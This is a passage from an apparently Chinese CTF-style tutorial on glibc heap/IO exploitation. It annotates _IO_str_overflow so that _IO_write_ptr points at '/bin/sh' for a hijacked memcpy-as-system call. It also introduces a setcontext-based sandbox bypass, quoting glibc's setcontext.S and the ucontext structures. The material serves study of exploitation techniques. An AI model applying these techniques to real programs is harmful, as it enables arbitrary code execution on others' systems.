<p>需要绕过内容总结如下 * 需要<code>more &gt; count</code>，能再次返回执行<code>__mempcpy</code>，且要想再次返回执行<code>memcpy</code>，由于此时<code>f-&gt;_IO_write_ptr</code>被<code>_IO_str_overflow</code>函数修改为指向<code>"/bin/sh"</code>字符串，因此<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>可能为一个很大的值，导致<code>count &gt; more</code>，进而更新<code>count</code>为<code>more</code>，因此再次循环时要求<code>more &gt; 20</code>。由于上一次循环中依次执行了<code>more -= count</code>和<code>more--</code>语句，因此要求<code>more ≥ count + 1 + 21</code> * 需要<code>count &gt; 20</code>，因此<code>count</code>至少为<code>21</code></p>
<p>第一次执行<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code></p>
<ul>
<li><code>_IO_write_ptr</code>为<code>__mempcpy</code>表项</li>
<li><code>s</code>为要写入的内容</li>
</ul>
<p>再次执行<code>__mempcpy (f-&gt;_IO_write_ptr, s, count)</code></p>
<ul>
<li>需要绕过<code>if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</code>，具体绕过方式接下来会介绍</li>
<li><code>f-&gt;_IO_write_ptr</code>为<code>rdi</code>,<code>s</code>为<code>rsi</code>，<code>count</code>为<code>rdx</code></li>
</ul>
<p>同样，执行<code>_IO_str_overflow</code>需要绕过内容也比较多。该函数的作用是控制<code>fp-&gt;_IO_write_ptr</code>，从而控制<code>_IO_default_xsputn</code>第二次循环中<code>__mempcpy</code>的第一个参数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">    <span class="comment">// 需要进入来控制 fp-&gt;_IO_write_ptr ， _flags==0x400</span></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; <span class="comment">// 控制 fp-&gt;_IO_write_ptr 指向 &amp;&quot;/bin/sh&quot; - 1 作为下一次 memcpy(system) 的第一个参数。</span></span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="comment">// 不能进入，要让 _IO_blen (fp)  ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 足够大。</span></span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">      <span class="comment">// 此处 fp-&gt;_IO_write_ptr 自加1，所以之前要少1.</span></span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure></div>
<p>需要绕过内容总结如下： * <code>_flags = 0x400</code> * <code>fp-&gt;_IO_read_ptr</code>为再次执行<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code>的<code>rdi - 1</code> * <code>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</code>要足够大，一般设置<code>(fp)-&gt;_IO_buf_end = 0xFFFFFFFFFFFFFFF0</code>即可</p>
<p>[[houseofkmwl1.png]]</p>
<h3 id="house-of-一骑当千">house of 一骑当千</h3>
<p>而<code>house_of_一骑当千</code>是一种只用<code>setcontext</code>就定能绕过沙盒攻击手法</p>
<h4 id="ucontext函数族"><code>ucontext</code>函数族</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getcontext</span><span class="params">(<span class="type">ucontext_t</span> *ucp)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">setcontext</span><span class="params">(<span class="type">const</span> <span class="type">ucontext_t</span> *ucp)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">makecontext</span><span class="params">(<span class="type">ucontext_t</span> *ucp, <span class="type">void</span> (*func)(), <span class="type">int</span> argc, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">swapcontext</span><span class="params">(<span class="type">ucontext_t</span> *<span class="keyword">restrict</span> oucp,<span class="type">const</span> <span class="type">ucontext_t</span> *<span class="keyword">restrict</span> ucp)</span>;</span><br></pre></td></tr></table></figure></div>
<ol type="1">
<li><code>getcontext</code>用来获取用户上下文</li>
<li><code>setcontext</code>用来设置用户上下文</li>
<li><code>makecontext</code>操作用户上下文，可以设置执行函数，本质调用<code>setcontext</code></li>
<li><code>swapcontext</code>进行两个上下文的交换</li>
</ol>
<h5 id="setcontext"><code>setcontext</code></h5>
<p>以我们关注的<code>setcontext</code>为例 ，它是由汇编所写，在 <code>/sysdeps/unix/sysv/linux/x86_64/setcontext.S</code>中。剥离复杂的宏之后发现，除了信号量系统调(<code>__NR_rt_sigprocmask</code>)用外，无非就是一些赋值操作。（代码虽然很长，但为了展现全貌我就不做删减了，大家关注中文注释的地方）</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(__setcontext)</span><br><span class="line">    <span class="comment">/* Save argument since syscall will destroy it.  */</span></span><br><span class="line">    pushq    %rdi</span><br><span class="line">    <span class="title function_">cfi_adjust_cfa_offset</span><span class="params">(<span class="number">8</span>)</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Set the signal mask with</span></span><br><span class="line"><span class="comment">       rt_sigprocmask (SIG_SETMASK, mask, NULL, _NSIG/8).  */</span></span><br><span class="line">    leaq    <span class="title function_">oSIGMASK</span><span class="params">(%rdi)</span>, %rsi</span><br><span class="line">    xorl    %edx, %edx</span><br><span class="line">    movl    $SIG_SETMASK, %edi</span><br><span class="line">    movl    $_NSIG8,%r10d</span><br><span class="line">    movl    $__NR_rt_sigprocmask, %eax</span><br><span class="line">    syscall</span><br><span class="line">    <span class="comment">/* Pop the pointer into RDX. The choice is arbitrary, but</span></span><br><span class="line"><span class="comment">       leaving RDI and RSI available for use later can avoid</span></span><br><span class="line"><span class="comment">       shuffling values.  */</span></span><br><span class="line">    popq    %rdx   # 这是就是 rdi 向 rdx转换的关键。</span><br><span class="line">    <span class="title function_">cfi_adjust_cfa_offset</span><span class="params">(<span class="number">-8</span>)</span></span><br><span class="line">    cmpq    $-4095, %rax        <span class="comment">/* Check %rax for error.  */</span></span><br><span class="line">    jae    SYSCALL_ERROR_LABEL    <span class="comment">/* Jump to error handler if error.  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Restore the floating-point context.  Not the registers, only the</span></span><br><span class="line"><span class="comment">       rest.  */</span></span><br><span class="line">    movq    <span class="title function_">oFPREGS</span><span class="params">(%rdx)</span>, %rcx</span><br><span class="line">    <span class="title function_">fldenv</span>    <span class="params">(%rcx)</span></span><br><span class="line">    ldmxcsr <span class="title function_">oMXCSR</span><span class="params">(%rdx)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Load the new stack pointer, the preserved registers and</span></span><br><span class="line"><span class="comment">       registers used for passing args.  */</span></span><br><span class="line">    <span class="title function_">cfi_def_cfa</span><span class="params">(%rdx, <span class="number">0</span>)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%rbx,oRBX)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%rbp,oRBP)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%r12,oR12)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%r13,oR13)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%r14,oR14)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%r15,oR15)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%rsp,oRSP)</span></span><br><span class="line">    <span class="title function_">cfi_offset</span><span class="params">(%rip,oRIP)</span></span><br><span class="line">    <span class="comment">/* 这里往下就是 setcontext+61 的地方*/</span></span><br><span class="line">    movq    <span class="title function_">oRSP</span><span class="params">(%rdx)</span>, %rsp</span><br><span class="line">    movq    <span class="title function_">oRBX</span><span class="params">(%rdx)</span>, %rbx</span><br><span class="line">    movq    <span class="title function_">oRBP</span><span class="params">(%rdx)</span>, %rbp</span><br><span class="line">    movq    <span class="title function_">oR12</span><span class="params">(%rdx)</span>, %r12</span><br><span class="line">    movq    <span class="title function_">oR13</span><span class="params">(%rdx)</span>, %r13</span><br><span class="line">    movq    <span class="title function_">oR14</span><span class="params">(%rdx)</span>, %r14</span><br><span class="line">    movq    <span class="title function_">oR15</span><span class="params">(%rdx)</span>, %r15</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHSTK_ENABLED</span></span><br><span class="line">    <span class="comment">/* Check if shadow stack is enabled.  */</span></span><br><span class="line">    testl    $X86_FEATURE_1_SHSTK, %fs:FEATURE_1_OFFSET</span><br><span class="line">    jz    <span class="title function_">L</span><span class="params">(no_shstk)</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* If the base of the target shadow stack is the same as the</span></span><br><span class="line"><span class="comment">       base of the current shadow stack, we unwind the shadow</span></span><br><span class="line"><span class="comment">       stack.  Otherwise it is a stack switch and we look for a</span></span><br><span class="line"><span class="comment">       restore token.  */</span></span><br><span class="line">    movq    <span class="title function_">oSSP</span><span class="params">(%rdx)</span>, %rsi</span><br><span class="line">    movq    %rsi, %rdi</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Get the base of the target shadow stack.  */</span></span><br><span class="line">    <span class="title function_">movq</span>    <span class="params">(oSSP + <span class="number">8</span>)</span><span class="params">(%rdx)</span>, %rcx</span><br><span class="line">    cmpq    %fs:SSP_BASE_OFFSET, %rcx</span><br><span class="line">    je    <span class="title function_">L</span><span class="params">(unwind_shadow_stack)</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_">L</span><span class="params">(find_restore_token_loop)</span>:</span><br><span class="line">    <span class="comment">/* Look for a restore token.  */</span></span><br><span class="line">    movq    -8<span class="params">(%rsi)</span>, %rax</span><br><span class="line">    andq    $-8, %rax</span><br><span class="line">    cmpq    %rsi, %rax</span><br><span class="line">    je    <span class="title function_">L</span><span class="params">(restore_shadow_stack)</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Try the next slot.  */</span></span><br><span class="line">    subq    $8, %rsi</span><br><span class="line">    jmp    <span class="title function_">L</span><span class="params">(find_restore_token_loop)</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_">L</span><span class="params">(restore_shadow_stack)</span>:</span><br><span class="line">    <span class="comment">/* Pop return address from the shadow stack since setcontext</span></span><br><span class="line"><span class="comment">       will not return.  */</span></span><br><span class="line">    movq    $1, %rax</span><br><span class="line">    incsspq    %rax</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Use the restore stoken to restore the target shadow stack.  */</span></span><br><span class="line">    rstorssp -8<span class="params">(%rsi)</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Save the restore token on the old shadow stack.  NB: This</span></span><br><span class="line"><span class="comment">       restore token may be checked by setcontext or swapcontext</span></span><br><span class="line"><span class="comment">       later.  */</span></span><br><span class="line">    saveprevssp</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Record the new shadow stack base that was switched to.  */</span></span><br><span class="line">    <span class="title function_">movq</span>    <span class="params">(oSSP + <span class="number">8</span>)</span><span class="params">(%rdx)</span>, %rax</span><br><span class="line">    movq    %rax, %fs:SSP_BASE_OFFSET</span><br><span class="line"> </span><br><span class="line"><span class="title function_">L</span><span class="params">(unwind_shadow_stack)</span>:</span><br><span class="line">    rdsspq    %rcx</span><br><span class="line">    subq    %rdi, %rcx</span><br><span class="line">    je    <span class="title function_">L</span><span class="params">(skip_unwind_shadow_stack)</span></span><br><span class="line">    negq    %rcx</span><br><span class="line">    shrq    $3, %rcx</span><br><span class="line">    movl    $255, %esi</span><br><span class="line"><span class="title function_">L</span><span class="params">(loop)</span>:</span><br><span class="line">    cmpq    %rsi, %rcx</span><br><span class="line">    cmovb    %rcx, %rsi</span><br><span class="line">    incsspq    %rsi</span><br><span class="line">    subq    %rsi, %rcx</span><br><span class="line">    ja    <span class="title function_">L</span><span class="params">(loop)</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_">L</span><span class="params">(skip_unwind_shadow_stack)</span>:</span><br><span class="line">    movq    <span class="title function_">oRSI</span><span class="params">(%rdx)</span>, %rsi</span><br><span class="line">    movq    <span class="title function_">oRDI</span><span class="params">(%rdx)</span>, %rdi</span><br><span class="line">    movq    <span class="title function_">oRCX</span><span class="params">(%rdx)</span>, %rcx</span><br><span class="line">    movq    <span class="title function_">oR8</span><span class="params">(%rdx)</span>, %r8</span><br><span class="line">    movq    <span class="title function_">oR9</span><span class="params">(%rdx)</span>, %r9</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Get the return address set with getcontext.  */</span></span><br><span class="line">    movq    <span class="title function_">oRIP</span><span class="params">(%rdx)</span>, %r10</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Setup finally %rdx.  */</span></span><br><span class="line">    movq    <span class="title function_">oRDX</span><span class="params">(%rdx)</span>, %rdx</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Check if return address is valid for the case when setcontext</span></span><br><span class="line"><span class="comment">       is invoked from __start_context with linked context.  */</span></span><br><span class="line">    rdsspq    %rax</span><br><span class="line">    <span class="title function_">cmpq</span>    <span class="params">(%rax)</span>, %r10</span><br><span class="line">    <span class="comment">/* Clear RAX to indicate success.  NB: Don&#x27;t use xorl to keep</span></span><br><span class="line"><span class="comment">       EFLAGS for jne.  */</span></span><br><span class="line">    movl    $0, %eax</span><br><span class="line">    jne    <span class="title function_">L</span><span class="params">(jmp)</span></span><br><span class="line">    <span class="comment">/* Return to the new context if return address valid.  */</span></span><br><span class="line">    pushq    %r10</span><br><span class="line">    ret</span><br><span class="line"> </span><br><span class="line"><span class="title function_">L</span><span class="params">(jmp)</span>:</span><br><span class="line">    <span class="comment">/* Jump to the new context directly.  */</span></span><br><span class="line">    jmp    *%r10</span><br><span class="line"> </span><br><span class="line"><span class="title function_">L</span><span class="params">(no_shstk)</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* The following ret should return to the address set with</span></span><br><span class="line"><span class="comment">    getcontext.  Therefore push the address on the stack.  */</span></span><br><span class="line">    movq    <span class="title function_">oRIP</span><span class="params">(%rdx)</span>, %rcx</span><br><span class="line">    pushq    %rcx</span><br><span class="line"> </span><br><span class="line">    movq    <span class="title function_">oRSI</span><span class="params">(%rdx)</span>, %rsi</span><br><span class="line">    movq    <span class="title function_">oRDI</span><span class="params">(%rdx)</span>, %rdi</span><br><span class="line">    movq    <span class="title function_">oRCX</span><span class="params">(%rdx)</span>, %rcx</span><br><span class="line">    movq    <span class="title function_">oR8</span><span class="params">(%rdx)</span>, %r8</span><br><span class="line">    movq    <span class="title function_">oR9</span><span class="params">(%rdx)</span>, %r9</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Setup finally %rdx.  */</span></span><br><span class="line">    movq    <span class="title function_">oRDX</span><span class="params">(%rdx)</span>, %rdx</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* End FDE here, we fall into another context.  */</span></span><br><span class="line">    cfi_endproc</span><br><span class="line">    cfi_startproc</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Clear rax to indicate success.  */</span></span><br><span class="line">    xorl    %eax, %eax</span><br><span class="line">    ret</span><br><span class="line"><span class="title function_">PSEUDO_END</span><span class="params">(__setcontext)</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_">weak_alias</span> <span class="params">(__setcontext, setcontext)</span></span><br></pre></td></tr></table></figure></div>
<h4 id="ucontext结构体"><code>ucontext</code>结构体</h4>
<p>从<code>ucontext</code>函数族中可以看到存在<code>ucontext</code>类型的结构体，也就是传入<code>setcontext</code>的<code>rdi</code>。这个结构体如下。 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> __ctx(uc_flags); <span class="comment">// 1个字长</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span><span class="comment">//1个字长</span></span><br><span class="line">    <span class="type">stack_t</span> uc_stack; <span class="comment">//3个字长</span></span><br><span class="line">    <span class="type">mcontext_t</span> uc_mcontext; <span class="comment">//操作部分1</span></span><br><span class="line">    <span class="type">sigset_t</span> uc_sigmask; <span class="comment">//操作部分2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span> <span class="comment">//操作部分3</span></span><br><span class="line">     __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> __ssp[<span class="number">4</span>];<span class="comment">//操作部分4</span></span><br><span class="line">  &#125; <span class="type">ucontext_t</span>;</span><br></pre></td></tr></table></figure></div></p>
<p>在<code>setcontext</code>函数中，除了对<code>mcontext_t uc_mcontext;</code> <code>sigset_t uc_sigmask;</code> <code>struct _libc_fpstate __fpregs_mem __ssp</code>这4个进行操作外，并没有对其他部分操作，也就是我们可以不关心其他的值。</p>
<ol type="1">
<li><p><code>uc_sigmask</code>：这个主要是负责信号量，<strong>经测试全是0就可以，当然也可以使用其他程序拷贝过来的信号量。</strong></p></li>
<li><p><code>uc_mcontext</code>：这个就是存储寄存器的结构体，也是我们平时<code>setcontext+53</code>所使用的地方。结构体如下</p></li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">gregset_t</span> __ctx(gregs);</span><br><span class="line">    <span class="comment">/* Note that fpregs is a pointer.  */</span></span><br><span class="line">    <span class="type">fpregset_t</span> __ctx(fpregs);</span><br><span class="line">    __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">mcontext_t</span>;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">greg_t</span> <span class="type">gregset_t</span>[__NGREG];</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __USE_GNU</span></span><br><span class="line"><span class="comment">/* Number of each register in the `gregset_t&#x27; array.  */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  REG_R8 = <span class="number">0</span>,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R8        REG_R8</span></span><br><span class="line">  REG_R9,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R9        REG_R9</span></span><br><span class="line">  REG_R10,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R10    REG_R10</span></span><br><span class="line">  REG_R11,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R11    REG_R11</span></span><br><span class="line">  REG_R12,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R12    